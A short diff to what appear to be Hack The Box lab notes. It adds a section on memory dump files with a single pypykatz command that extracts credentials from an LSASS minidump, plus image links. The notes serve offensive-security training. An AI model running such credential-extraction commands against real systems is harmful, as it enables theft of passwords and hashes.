@@ -144,3 +144,10 @@ rpcclient $> exit
 ---
 
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/6b970a7a-aa71-4612-8fe8-9f64f037600f)
+
+
+## Dump File (.DMP)
+```CSS
+▶ pypykatz lsa minidump lsass.DMP
+```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/e6eed677-d497-4777-be99-34b63bea7628)
